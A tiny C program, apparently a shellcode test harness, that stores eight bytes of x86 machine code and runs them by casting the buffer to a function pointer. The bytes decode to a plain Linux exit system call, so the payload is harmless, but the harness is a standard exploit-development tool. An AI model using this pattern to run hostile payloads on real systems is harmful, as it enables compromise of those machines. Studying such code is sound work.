#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x02\x58\x48\x89\xc3\xcd\x80";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
